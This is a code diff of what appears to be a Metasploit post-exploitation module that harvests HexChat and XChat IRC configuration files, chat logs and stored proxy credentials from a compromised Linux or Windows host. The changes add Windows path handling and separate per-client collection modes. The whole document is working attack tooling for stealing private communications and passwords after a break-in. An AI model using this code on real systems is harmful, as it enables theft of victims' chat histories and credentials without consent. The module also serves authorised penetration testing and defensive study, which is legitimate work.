@@ -29,9 +29,13 @@ class MetasploitModule < Msf::Post
           [
             ['CONFIGS', { 'Description' => 'Collect config files' } ],
             ['CHATS', { 'Description' => 'Collect chat logs with a pattern' } ],
-            ['ALL', { 'Description' => 'Collect both the plists and chat logs' }]
+            ['ALL', { 'Description' => 'Collect both the configs and chat logs' }]
           ],
-        'DefaultAction' => 'ALL'
+        'DefaultAction' => 'ALL',
+        'References' =>
+          [
+            ['URL', 'https://hexchat.readthedocs.io/en/latest/settings.html']
+          ]
       )
     )
     register_options([
@@ -44,18 +48,34 @@ class MetasploitModule < Msf::Post
     cmd_exec('/usr/bin/whoami').chomp
   end
 
-  def get_paths
-    user = whoami
-    fail_with(Failure::Unknown, 'Unable to get username.') if user.blank?
-    vprint_status("Detcted username: #{user}")
-
-    paths = []
-    if datastore['HEXCHAT']
-      # https://hexchat.readthedocs.io/en/latest/settings.html
-      paths << "/home/#{user}/.config/hexchat/"
+  def sep
+    if session.platform == 'windows'
+      return '\\'
+    else
+      return '/'
     end
-    if datastore['XCHAT']
-      paths << "/home/#{user}/.xchat2/"
+  end
+
+  def get_paths(mode = 'HEXCHAT')
+    paths = []
+    if session.platform == 'windows'
+      appdata = get_env('APPDATA')
+      if mode == 'HEXCHAT'
+        paths << "#{appdata}\\HexChat\\"
+      elsif datastore['XCHAT']
+        paths << "#{appdata}\\X-Chat 2\\"
+      end
+    else
+      user = whoami
+      fail_with(Failure::Unknown, 'Unable to get username.') if user.blank?
+      vprint_status("Detcted username: #{user}")
+
+      if mode == 'HEXCHAT'
+        # https://hexchat.readthedocs.io/en/latest/settings.html
+        paths << "/home/#{user}/.config/hexchat/"
+      elsif mode == 'XCHAT'
+        paths << "/home/#{user}/.xchat2/"
+      end
     end
     paths
   end
@@ -68,30 +88,40 @@ class MetasploitModule < Msf::Post
       # are files: sever.log, <server>.log, .log
       folders = dir base
       folders.each do |folder|
-        file = dir "#{base}/#{folder}"
+        file = dir "#{base}#{sep}#{folder}"
         file.each do |f|
           if f.end_with? '.log'
-            files << "#{base}/#{folder}/#{f}"
+            files << "#{base}#{sep}#{folder}#{sep}#{f}"
           end
         end
       end
     elsif mode == 'XCHAT'
-      # the original methods written by @sinn3r
-      list = cmd_exec("ls -l #{base}*.log")
-      return [] if list =~ /No such file or directory/
+      if session.platform == 'windows'
+        file = dir base
+        file.each do |f|
+          if f.end_with? '.log'
+            files << "#{base}#{sep}#{f}"
+          end
+        end
 
-      # currently unsure what this is intending to do XXX
-      files = list.scan(/\d+\x20\w{3}\x20\d+\x20\d{2}\:\d{2}\x20(.+)$/).flatten
+      else
+        # the original methods written by @sinn3r
+        list = cmd_exec("ls -l #{base}*.log")
+        return [] if list =~ /No such file or directory/
+
+        # currently unsure what this is intending to do -h00die
+        files = list.scan(/\d+\x20\w{3}\x20\d+\x20\d{2}\:\d{2}\x20(.+)$/).flatten
+      end
     end
     files
   end
 
-  def save(type, data)
+  def save(type, data, mode = 'HEXCHAT')
     case type
     when :configs
-      type = 'hexchat.config'
+      type = "#{mode.downcase}.config"
     when :chatlogs
-      type = 'hexchat.chatlogs'
+      type = "#{mode.downcase}.chatlogs"
     end
 
     data.each do |d|
@@ -107,13 +137,16 @@ class MetasploitModule < Msf::Post
     end
   end
 
-  def get_chatlogs(base)
+  def get_chatlogs(base, mode = 'HEXCHAT')
     logs = []
-    if datastore['XCHAT']
-      base_logs = "#{base}/xchatlogs"
-      vprint_error("Chat logs not found at #{base_logs}") unless directory? base_logs
+    if mode == 'XCHAT'
+      base_logs = "#{base}#{sep}xchatlogs"
+      unless directory? base_logs
+        vprint_error("Chat logs not found at #{base_logs}")
+        return logs
+      end
 
-      list_logs(base_logs, 'xchat').each do |l|
+      list_logs(base_logs, 'XCHAT').each do |l|
         vprint_status("Downloading: #{l}")
         data = read_file(l)
         logs << {
@@ -121,10 +154,12 @@ class MetasploitModule < Msf::Post
           data: data
         }
       end
-    end
-    if datastore['HEXCHAT']
-      base_logs = "#{base}/logs"
-      vprint_error("Chat logs not found at #{base_logs}") unless directory? base_logs
+    elsif mode == 'HEXCHAT'
+      base_logs = "#{base}#{sep}logs"
+      unless directory? base_logs
+        vprint_error("Chat logs not found at #{base_logs}")
+        return logs
+      end
 
       list_logs(base_logs).each do |l|
         vprint_status("Downloading: #{l}")
@@ -172,20 +207,19 @@ class MetasploitModule < Msf::Post
         private_data: proxypass,
         public_data: proxyuser,
         service_name: 'proxy',
-        module_fullname: self.fullname,
+        module_fullname: fullname,
         status: Metasploit::Model::Login::Status::UNTRIED
       })
     end
   end
 
-  def get_configs(base)
+  def get_configs(base, mode = 'HEXCHAT')
     config = []
     files = []
-    if datastore['XCHAT']
-      files += ['servlist_.conf', 'xchat.conf']
-    end
-    if datastore['HEXCHAT']
-      files += ['servlist.conf', 'hexchat.conf']
+    if mode == 'XCHAT'
+      files = ['servlist_.conf', 'xchat.conf']
+    elsif mode == 'HEXCHAT'
+      files = ['servlist.conf', 'hexchat.conf']
     end
     files.each do |f|
       conf = base + f
@@ -212,16 +246,32 @@ class MetasploitModule < Msf::Post
   def run
     fail_with(Failure::BadConfig, 'Please specify an action.') if action.nil?
 
-    get_paths.each do |base|
-      unless directory? base
-        print_error("HexChat not installed or used by user. #{base} not found.")
+    if datastore['XCHAT']
+      get_paths('XCHAT').each do |base|
+        unless directory? base
+          print_error("HexChat not installed or used by user. #{base} not found.")
+        end
+
+        configs = get_configs(base, 'XCHAT') if action.name =~ /ALL|CONFIGS/i
+        chatlogs = get_chatlogs(base, 'XCHAT') if action.name =~ /ALL|CHATS/i
+
+        save(:configs, configs, 'XCHAT') unless configs.empty?
+        save(:chatlogs, chatlogs, 'XCHAT') unless chatlogs.empty?
       end
+    end
 
-      configs = get_configs(base) if action.name =~ /ALL|CONFIGS/i
-      chatlogs = get_chatlogs(base) if action.name =~ /ALL|CHATS/i
+    if datastore['HEXCHAT']
+      get_paths.each do |base|
+        unless directory? base
+          print_error("HexChat not installed or used by user. #{base} not found.")
+        end
 
-      save(:configs, configs) unless configs.empty?
-      save(:chatlogs, chatlogs) unless chatlogs.empty?
+        configs = get_configs(base) if action.name =~ /ALL|CONFIGS/i
+        chatlogs = get_chatlogs(base) if action.name =~ /ALL|CHATS/i
+
+        save(:configs, configs) unless configs.empty?
+        save(:chatlogs, chatlogs) unless chatlogs.empty?
+      end
     end
   end
 end
